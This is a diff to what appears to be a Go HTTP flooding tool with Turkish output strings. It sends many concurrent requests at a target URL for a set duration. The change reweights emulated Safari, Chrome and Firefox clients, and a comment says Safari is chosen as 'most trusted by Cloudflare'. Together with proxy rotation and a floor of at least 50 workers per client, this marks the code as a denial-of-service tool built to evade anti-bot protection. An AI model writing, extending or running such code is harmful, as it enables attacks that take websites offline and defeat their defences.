@@ -124,22 +124,38 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 		}
 	}
 
-	// Create multiple clients per browser for connection multiplying
+	// Create multiple clients per browser with weighted distribution.
+	// Safari 40%, Chrome 30%, Firefox 30% - Safari is most trusted by Cloudflare.
 	type browserSpec struct {
 		name    string
 		profile gofire.BrowserProfile
+		clients int // number of client instances
 	}
+
+	// Total ~10 clients split: 4 safari + 3 chrome + 3 firefox
+	safariClients := clientsPerBrowser     // 4
+	chromeClients := clientsPerBrowser - 1 // 3
+	firefoxClients := clientsPerBrowser - 1 // 3
+	if chromeClients < 1 {
+		chromeClients = 1
+	}
+	if firefoxClients < 1 {
+		firefoxClients = 1
+	}
+
 	browsers := []browserSpec{
-		{"firefox", gofire.Firefox148},
-		{"chrome", gofire.Chrome146},
-		{"safari", gofire.SafariIOS18},
+		{"firefox", gofire.Firefox148, firefoxClients},
+		{"chrome", gofire.Chrome146, chromeClients},
+		{"safari", gofire.SafariIOS18, safariClients},
 	}
 
 	groups := make([]*clientGroup, len(browsers))
 
-	// Workers per client: threads * streams / total clients
-	// No artificial cap - let the user control concurrency
-	totalClients := clientsPerBrowser * len(browsers)
+	// Calculate total clients for worker distribution
+	totalClients := 0
+	for _, bs := range browsers {
+		totalClients += bs.clients
+	}
 	workersPerClient := (threads * streams) / totalClients
 	if workersPerClient < 50 {
 		workersPerClient = 50
@@ -148,7 +164,7 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 	for bi, bs := range browsers {
 		cg := &clientGroup{name: bs.name}
 
-		for i := 0; i < clientsPerBrowser; i++ {
+		for i := 0; i < bs.clients; i++ {
 			c, err := gofire.Emulate(bs.profile, baseOpts...)
 			if err != nil {
 				fmt.Fprintf(os.Stderr, "hata: %s client[%d] olusturulamadi: %v\n", bs.name, i, err)
@@ -179,8 +195,8 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 	actualWorkers := workersPerClient * totalClients
 	fmt.Printf("hedef: %s | sure: %ds | worker: %d (%d/client) | method: %s\n",
 		targetURL, durSec, actualWorkers, workersPerClient, method)
-	fmt.Printf("browser: %d firefox + %d chrome + %d safari client (toplam %d h2 baglanti)\n",
-		clientsPerBrowser, clientsPerBrowser, clientsPerBrowser, totalClients)
+	fmt.Printf("browser: %d safari(40%%) + %d chrome(30%%) + %d firefox(30%%) client (toplam %d baglanti)\n",
+		safariClients, chromeClients, firefoxClients, totalClients)
 	if proxyRotator != nil {
 		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
 	} else if proxyArg != "" {
